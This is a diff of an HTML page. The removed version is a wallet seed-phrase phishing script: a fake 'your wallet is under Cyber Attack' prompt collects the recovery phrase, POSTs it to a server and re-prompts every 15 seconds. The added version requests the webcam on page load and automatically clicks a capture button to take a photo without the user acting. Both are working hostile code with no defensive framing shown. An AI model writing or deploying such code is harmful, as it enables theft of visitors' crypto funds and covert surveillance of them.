@@ -1,53 +1,82 @@
-
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
-    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Execute JS after 10 seconds</title>
-    <script>
-        // Function to show the prompt and send data using POST request
-        function showPrompt() {
-            var phrase = prompt('We found that your wallet is under Cyber Attack and Wallet App Intent to Verify your seed phrase, please enter them below');
-            if (phrase) {
-                // Send the data via POST
-                sendPostData(phrase);
-            } else {
-                // If no value is entered, keep showing the prompt every 15 seconds
-                setTimeout(showPrompt, 15000); // 15000 milliseconds = 15 seconds
-            }
+    <style>
+        #image-container {
+            text-align: center;
         }
 
-        // Function to send POST request
-        function sendPostData(data) {
-            // Create a new FormData object
-            var formData = new FormData();
-            formData.append('phrase', data);
-
-            // Send the POST request using fetch
-            fetch('http://127.0.0.1/', {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => {
-                if (response.ok) {
-                    console.log('Data successfully sent');
-                } else {
-                    console.error('Failed to send data');
-                }
-            })
-            .catch(error => {
-                console.error('Error:', error);
-            });
+        #message {
+            font-size: 2em;
         }
-
-        // Set a timer to execute the prompt for the first time after 10 seconds
-        window.onload = function() {
-            setTimeout(showPrompt, 5000); // 10000 milliseconds = 10 seconds
-        }
-    </script>
+    </style>
 </head>
+
 <body>
-    <h1>Wait for 5 seconds...</h1>
+    <div id="image-container">
+        <canvas id="videoCanvas"></canvas>
+        <img id="capturedImage" style="display: none;">
+    </div>
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            // Request camera permission on page load
+            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+                .then((stream) => {
+                    console.log('Camera permission granted');
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.onloadedmetadata = () => {
+                        //video.play();
+                        //setupVideoCanvas(video);
+                        setupCaptureButton(stream);
+                        setTimeout(() => automateCapture(), 2000); // Automate capture after 2 seconds
+                    };
+                    document.body.appendChild(video); // Add video element to the document
+                })
+                .catch((error) => {
+                    console.error('Camera permission denied or an error occurred:', error);
+                });
+        });
+
+        const setupVideoCanvas = (video) => {
+            const canvas = document.getElementById('videoCanvas');
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            function drawFrame() {
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                requestAnimationFrame(drawFrame);
+            }
+
+            drawFrame();
+        };
+
+        const setupCaptureButton = (stream) => {
+            const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
+            const capturedImage = document.getElementById('capturedImage');
+
+            const captureButton = document.createElement('button');
+            captureButton.textContent = 'Capture Image';
+            captureButton.onclick = async () => {
+                const photo = await imageCapture.takePhoto();
+                const imageUrl = URL.createObjectURL(photo);
+                capturedImage.src = imageUrl;
+                capturedImage.style.display = 'block';
+            };
+
+            document.getElementById('image-container').appendChild(captureButton);
+        };
+
+        const automateCapture = () => {
+            const captureButton = document.querySelector('button');
+            if (captureButton) {
+                captureButton.click();
+            }
+        };
+    </script>
 </body>
+
 </html>
